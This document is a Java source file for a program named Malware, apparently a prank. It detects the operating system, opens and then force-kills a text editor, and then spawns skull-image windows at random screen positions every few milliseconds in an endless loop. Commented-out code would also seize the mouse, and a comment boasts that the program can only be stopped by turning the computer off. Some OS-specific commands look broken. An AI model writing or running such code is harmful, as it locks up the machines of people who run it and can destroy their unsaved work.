import javax.swing.*;
import java.util.Random;
import java.awt.*;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

// Program can't be terminated if executed
// with Robot code (You will have to turn off
// your computer)

public class Malware{

    private final String OS_VERSION;
    private final Dimension displayResolution;

    private Malware(){
        this.OS_VERSION = System.getProperty("os.name");
        displayResolution = Toolkit.getDefaultToolkit().getScreenSize();
    }

    private void execute(){
        for(int i = 5; i > 0; i--){
            try{
                TimeUnit.SECONDS.sleep(1);
                System.out.println("Executing in: " + i);
            } catch(InterruptedException e){
                e.printStackTrace();
            }
        }

        while(true){
            try {
                TimeUnit.MILLISECONDS.sleep(5);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            JFrame win = new JFrame("What have you done?");
            JLabel img = new JLabel(new ImageIcon("skull.png"));
            win.setIconImage(new ImageIcon("skull.png").getImage());
            win.setSize(300, 300);
            img.setSize(300, 300);
            win.add(img);
            win.setLocation(new Random().nextInt((int) this.displayResolution.getWidth()), new Random().nextInt(
                    (int) this.displayResolution.getHeight()));
            win.setVisible(true);
            // try{
            //     Robot robot = new Robot();
            //     robot.mouseMove(new Random().nextInt((int) this.displayResolution.getWidth()), new Random().nextInt(
            //             (int) this.displayResolution.getHeight()));
            // }
            // catch(AWTException e){
            //     e.printStackTrace();
            // }
        }
    }

    public static void main(String[] args) {
        Malware malware = new Malware();
        if(malware.OS_VERSION.equals("Windows XP") || malware.OS_VERSION.equals("Windows 8.1") || malware.OS_VERSION.equals("Windows 10")){
            try {
                ProcessBuilder pb = new ProcessBuilder("notepad", "what_have_you_done.txt");
                pb.start();
                TimeUnit.SECONDS.sleep(2);
                ProcessBuilder pbs = new ProcessBuilder("taskkill", "/F", "/IM", "notepad.exe");
                pbs.start();
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }

        if (malware.OS_VERSION.equals("Mac OS X")) {
            try {
                ProcessBuilder pb = new ProcessBuilder("open", "-a", "TextEdit", "what_have_you_done.txt");
                pb.start();
                TimeUnit.SECONDS.sleep(2);
                ProcessBuilder pbs = new ProcessBuilder("pkill", "TextEdit.app");
                pbs.start();
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }

        if (malware.OS_VERSION.equals("Linux")) {
            try {
                ProcessBuilder pb = new ProcessBuilder("cat", "what_have_you_done.txt");
                pb.start();
                TimeUnit.SECONDS.sleep(2);
                ProcessBuilder pbs = new ProcessBuilder("exit");
                pbs.start();
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }
        malware.execute();
    }
}